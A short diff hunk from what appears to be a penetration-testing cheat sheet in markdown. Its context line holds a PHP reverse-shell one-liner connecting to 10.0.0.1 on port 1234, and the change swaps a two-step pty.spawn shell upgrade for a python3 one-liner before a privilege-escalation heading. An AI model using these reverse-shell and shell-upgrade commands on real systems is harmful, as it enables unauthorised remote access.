@@ -118,8 +118,7 @@ php -r '$s=fsockopen("10.0.0.1",1234);exec("sh<&3>&3 2>&3");'
 
 - when i get "must be run from a terminal"
 ```python
-echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
-python /tmp/asdf.py
+python3 -c "import pty; pty.spawn('/bin/bash')"
 ```
 
 ### Privilege escalation
